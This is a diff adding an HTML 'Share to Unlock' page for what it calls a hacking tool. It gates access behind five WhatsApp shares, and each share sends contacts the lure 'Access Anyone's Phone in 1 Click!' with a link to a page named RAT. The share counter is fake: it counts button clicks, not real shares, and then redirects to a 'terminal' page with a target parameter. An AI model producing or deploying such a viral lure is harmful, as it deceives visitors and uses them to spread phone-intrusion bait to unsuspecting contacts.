@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share to Unlock</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h1 {
+      text-shadow: 0 0 10px #00ff00;
+      margin-top: 20px;
+    }
+
+    .box {
+      background: #111;
+      padding: 20px;
+      border: 1px solid #00ff00;
+      border-radius: 8px;
+      max-width: 400px;
+      margin: 30px auto;
+    }
+
+    .btn {
+      display: block;
+      width: 90%;
+      margin: 15px auto;
+      padding: 12px;
+      background-color: #111;
+      border: 1px solid #00ff00;
+      color: #00ff00;
+      font-size: 18px;
+      text-decoration: none;
+      border-radius: 8px;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #00ff00;
+      color: #000;
+      cursor: pointer;
+    }
+
+    .counter {
+      font-size: 18px;
+      margin-top: 15px;
+    }
+
+    .note {
+      color: #ccc;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .success {
+      color: #00ff00;
+      display: none;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Unlock Access</h1>
+  <div class="box">
+    <p>To proceed, you must share this hacking tool with <strong>5 friends</strong> on WhatsApp.</p>
+    <a class="btn" id="shareBtn" onclick="shareLink()">Share on WhatsApp</a>
+    <div class="counter">Shares completed: <span id="shareCount">0</span> / 5</div>
+    <p class="note">Once you reach 5 shares, the terminal will automatically unlock.</p>
+    <p class="success" id="successMsg">Redirecting to terminal...</p>
+  </div>
+
+  <script>
+    let shareCount = 0;
+    const requiredShares = 5;
+
+    function shareLink() {
+      const siteLink = "https://a3organisationa3-ops.github.io/RAT/";
+      const message = encodeURIComponent("🔥 Access Anyone's Phone in 1 Click! 🔥\nCheck this out now: " + siteLink);
+      const whatsappURL = `https://api.whatsapp.com/send?text=${message}`;
+
+      // Open WhatsApp
+      window.open(whatsappURL, "_blank");
+
+      // Count share
+      shareCount++;
+      document.getElementById('shareCount').innerText = shareCount;
+
+      // Check if user reached required shares
+      if (shareCount >= requiredShares) {
+        document.getElementById('successMsg').style.display = 'block';
+
+        // Wait for 2 seconds before redirect
+        setTimeout(() => {
+          const urlParams = new URLSearchParams(window.location.search);
+          const target = urlParams.get('target') || 'unknown';
+          window.location.href = "terminal.html?target=" + target;
+        }, 2000);
+      }
+    }
+  </script>
+</body>
+</html>
